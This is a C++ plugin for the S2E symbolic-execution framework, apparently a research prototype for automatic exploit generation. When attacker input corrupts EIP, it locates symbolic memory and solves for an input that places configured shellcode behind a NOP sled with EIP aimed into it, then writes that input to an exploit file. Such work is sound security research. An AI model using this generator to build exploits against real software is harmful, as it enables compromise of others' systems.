#include <algorithm>
#include <fstream>
#include <vector>
#include <s2e/S2E.h>
#include <s2e/S2EExecutor.h>
#include <s2e/Utils.h>
#include <s2e/ConfigFile.h>
#include <klee/Solver.h>
#include <klee/util/ExprUtil.h>
#include "ExploitGenerator.h"

using namespace std;

namespace s2e {
namespace plugins {

S2E_DEFINE_PLUGIN(ExploitGenerator,
                  "Exploit Vulnerabilities",
                  "Exploit Generator",);

void ExploitGenerator::initialize()
{
    m_shellCode = s2e()->getConfig()->getString(getConfigKey() + ".shellCode");
    /**
     * XXX: Generate correct shellcode
     * getString() escapes backslashes, thus, '\x61' becomes "x61"
     */
    m_shellCode = str2byte(m_shellCode);
    s2e()->getMessagesStream() << "ShellCode size: "
                               << m_shellCode.size() << "\n";

    s2e()->getCorePlugin()->onEipCorrupt.connect(
            sigc::mem_fun(*this, &ExploitGenerator::onEipCorrupt));
}

void ExploitGenerator::onEipCorrupt(
        S2EExecutionState *state,
        klee::ref<klee::Expr> eipValue)
{
    /* Address of the beginning of an object */
    set<uint64_t> taintedAddressSet;
    /**
     * first:  start address of a consecutive symbolic data
     * second: width of the symbolic data
     */
    map<uint64_t, uint64_t> symbolicArrayMap;

    m_eipValue = eipValue;

    s2e()->getMessagesStream(state) << "EIP is tainted by "
        << s2e()->getExecutor()->toConstantSilent(*state, m_eipValue)
        << ", original value is " << m_eipValue << "\n";

    findTaintedObjects(state, 0x00000000, 0xC0000000, &taintedAddressSet);
    findSymbolicArray(state, taintedAddressSet, &symbolicArrayMap);

    map<uint64_t, uint64_t>::iterator it_symbolicArray;
    for (it_symbolicArray = symbolicArrayMap.begin();
            it_symbolicArray != symbolicArrayMap.end(); it_symbolicArray++) {
        generateExploit(state,
            /* startAddress = */ it_symbolicArray->first,
            /* width = */ it_symbolicArray->second);
    }

    klee::ExecutionState *kleeState =
        static_cast<klee::ExecutionState*>(state);
    s2e()->getExecutor()->terminateStateEarly(*kleeState,
                                              "Successfully generate exploit");
}

void ExploitGenerator::findTaintedObjects(
        S2EExecutionState *state,
        uint64_t minAddress,
        uint64_t maxAddress,
        set<uint64_t> *taintedAddressSet)
{
    uint64_t hostAddress = 0;
    klee::ObjectPair op;

    for (uint64_t i_pageNumber = minAddress; i_pageNumber <= maxAddress;
            i_pageNumber += TARGET_PAGE_SIZE) {

        /* invalid page fault */
        if (likely(state->getPhysicalAddress(i_pageNumber) == (uint64_t) -1)) {
            continue;
        }

        for (uint64_t j_objectStartAddress = i_pageNumber;
                j_objectStartAddress <= i_pageNumber + TARGET_PAGE_SIZE;
                j_objectStartAddress += S2E_RAM_OBJECT_SIZE) {

            hostAddress = state->getHostAddress(j_objectStartAddress);

            if (hostAddress == (uint64_t) -1) {
                continue;
            }

            op = state->addressSpace.findObject(hostAddress);
            if (op.second->isAllConcrete()) {
                continue;
            }

            taintedAddressSet->insert(j_objectStartAddress);
        }
    }
}

void ExploitGenerator::findSymbolicArray(
        S2EExecutionState *state,
        set<uint64_t> const& taintedAddressSet,
        map<uint64_t, uint64_t> *symbolicArrayMap)
{
    klee::ObjectPair op;
    const klee::MemoryObject *mo;
    const klee::ObjectState *os;

    bool isPreviousByteConstant = true;
    uint64_t startAddress = 0, width = 0;

    set<uint64_t>::iterator it_objectStartAddress;
    for (it_objectStartAddress = taintedAddressSet.begin();
            it_objectStartAddress != taintedAddressSet.end();
            it_objectStartAddress++) {

        op = state->addressSpace.findObject(
             state->getHostAddress(*it_objectStartAddress));
        mo = op.first;
        os = op.second;

        uint64_t i_pageOffset = mo->address & ~S2E_RAM_OBJECT_MASK;
        for (; i_pageOffset < mo->size; i_pageOffset++) {

            klee::ref<klee::Expr> byte = os->read8(i_pageOffset);
            if (!isa<klee::ConstantExpr>(byte)) {
                /* Start of a symbolic array */
                if (isPreviousByteConstant) {
                    startAddress = *it_objectStartAddress | i_pageOffset;
                    width = 1;
                }
                else {
                    width++;
                }
                isPreviousByteConstant = false;
            }
            else {
                /* End of a symbolic array */
                if (!isPreviousByteConstant) {
                    s2e()->getMessagesStream(state)
                        << "Found Symbolic Array at " << hexval(startAddress)
                        << ", width " << width << "\n";
                    symbolicArrayMap->insert(make_pair(startAddress, width));
                }
                isPreviousByteConstant = true;
                continue;
            }
        }
    }
}

void ExploitGenerator::pruneInputConstraints(
        S2EExecutionState *state,
        klee::ExecutionState *exploitState)
{
    std::vector< klee::ref<klee::Expr> >
        pathConstraints(state->constraints.size());
    std::vector< klee::ref<klee::Expr> >::iterator it;

    it = std::set_difference(state->constraints.begin(),
                             state->constraints.end(),
                             state->inputConstraints.begin(),
                             state->inputConstraints.end(),
                             pathConstraints.begin());

    pathConstraints.resize(it - pathConstraints.begin());

    exploitState->constraints =
        *(new klee::ConstraintManager(pathConstraints));

    s2e()->getMessagesStream(state) << "Pruned "
        << state->inputConstraints.size() << " out of "
        << state->constraints.size() << " constraints\n";
}

klee::ref<klee::Expr> ExploitGenerator::generateConstraints(
        S2EExecutionState *state,
        uint64_t startAddress,
        uint64_t nopAddress,
        uint64_t shellCodeAddress)
{
    klee::ref<klee::Expr> byte, eipConstraint, exploitConstraint;

    exploitConstraint = klee::ConstantExpr::create(0x1, klee::Expr::Bool);

    /* shellcode constraint */
    for (int i = 0; i < m_shellCode.size(); i++) {
        byte = klee::EqExpr::create(
                state->readMemory8(shellCodeAddress + i),
                klee::ConstantExpr::create(
                    (uint8_t)m_shellCode[i],
                    klee::Expr::Int8));
        exploitConstraint = klee::AndExpr::create(exploitConstraint, byte);
    }

    /* nop sled constraint */
    for (int i = 0; i < shellCodeAddress - nopAddress; i++) {
        byte = klee::EqExpr::create(state->readMemory8(nopAddress + i),
                klee::ConstantExpr::create(0x90, klee::Expr::Int8));
        exploitConstraint = klee::AndExpr::create(exploitConstraint, byte);
    }

    /* eip constraint, eip >= lowerBound && eip <= upperBound */
    uint64_t lowerBound = nopAddress;
    uint64_t upperBound = shellCodeAddress;
    eipConstraint = klee::AndExpr::create(
            klee::UgeExpr::create(m_eipValue,
                klee::ConstantExpr::create(lowerBound, klee::Expr::Int64)),
            klee::UleExpr::create(m_eipValue,
                klee::ConstantExpr::create(upperBound, klee::Expr::Int64)));
    exploitConstraint = klee::AndExpr::create(
            exploitConstraint, eipConstraint);

    klee::Solver *solver = s2e()->getExecutor()->getSolver();
    bool isTrue;
    solver->mayBeTrue(
            klee::Query(state->constraints, exploitConstraint), isTrue);

    if (isTrue) {
        uint64_t nextAttempt = (startAddress + nopAddress) / 2;
        if (nextAttempt == startAddress) {
            s2e()->getMessagesStream(state) << "ShellCode starts at "
                                            << hexval(shellCodeAddress)
                                            << ", width "
                                            << m_shellCode.size() << "\n";

            s2e()->getMessagesStream(state) << "NOP sled starts at "
                                            << hexval(nopAddress)
                                            << ", width "
                                            << shellCodeAddress - nopAddress
                                            << "\n";

            s2e()->getMessagesStream(state) << "Set EIP between "
                                            << hexval(lowerBound) << " and "
                                            << hexval(upperBound) << "\n";

            return exploitConstraint;
        }
        else {
            return generateConstraints(state, startAddress,
                    nextAttempt, shellCodeAddress);
        }
    }
    else {
        uint64_t nextAttempt = (nopAddress + shellCodeAddress) / 2;
        if (nextAttempt == nopAddress) {
            return klee::ConstantExpr::create(0, klee::Expr::Bool);
        }
        else {
            return generateConstraints(state, startAddress,
                    nextAttempt, shellCodeAddress);
        }
    }
}

void ExploitGenerator::generateExploit(
        S2EExecutionState *state,
        uint64_t startAddress, uint64_t width)
{
    if (width < m_shellCode.size()) {
        s2e()->getMessagesStream(state) << "Not enough space, "
                                        << width << " < "
                                        << m_shellCode.size() << "\n";
        return;
    }

    s2e()->getMessagesStream(state) << "Generating exploit on symbolic array "
                                    << hexval(startAddress) << '\n';

    klee::ref<klee::Expr> exploitConstraint;

    uint64_t solutionNum = width - m_shellCode.size() + 1;
    for (uint64_t i = 0; i < solutionNum; i++) {
        uint64_t shellCodeOffset = solutionNum - i - 1;

        exploitConstraint = generateConstraints(state, startAddress,
                startAddress, startAddress + shellCodeOffset);

        if (!exploitConstraint->isZero()) {
            klee::ExecutionState* exploitState =
                new klee::ExecutionState(*state);
            pruneInputConstraints(state, exploitState);

            exploitState->addConstraint(exploitConstraint);

            ConcreteInputs out;
            bool hasSolution;
            hasSolution =
                s2e()->getExecutor()->getSymbolicSolution(*exploitState, out);

            if (!hasSolution) {
                s2e()->getWarningsStream()
                    << "Could not get symbolic solutions\n";
            }
            else {
                std::stringstream ss;
                std::vector<VarValuePair>::iterator it;
                for (it = out.begin(); it != out.end(); it++) {
                    const VarValuePair &vp = *it;

                    for (unsigned i = 0; i < vp.second.size(); ++i) {
                        ss << "\\x" << std::setw(2) << std::setfill('0')
                            << std::hex << (unsigned) vp.second[i] << std::dec;
                    }

                    stringstream filename;
                    filename << "exploit-"
                             << std::hex << startAddress << ".bin";

                    s2e()->getMessagesStream(state) << "Write exploit to file "
                                                    << filename.str() << '\n';

                    std::ofstream fs(
                            s2e()->getOutputFilename(filename.str()).c_str(),
                            std::ios::out | std::ios::binary);
                    fs << ss.str();
                    fs.close();
                }

                break;
            }
        }
    }
}

/**
 * input:  "x61x62x63"
 * output: "\x61\x62\x63"
 */
string ExploitGenerator::str2byte(string str) {
    char buf[3] = {'\0'};
    char chr = '\0';
    string byteString;

    for (int i = 0; i < str.size(); i += 3) {
        sprintf(buf, "%c%c", str[i + 1], str[i + 2]);
        chr = strtol(buf, NULL, 16);
        byteString.push_back(chr);
    }

    return byteString;
}

} // namespace plugins
} // namespace s2e
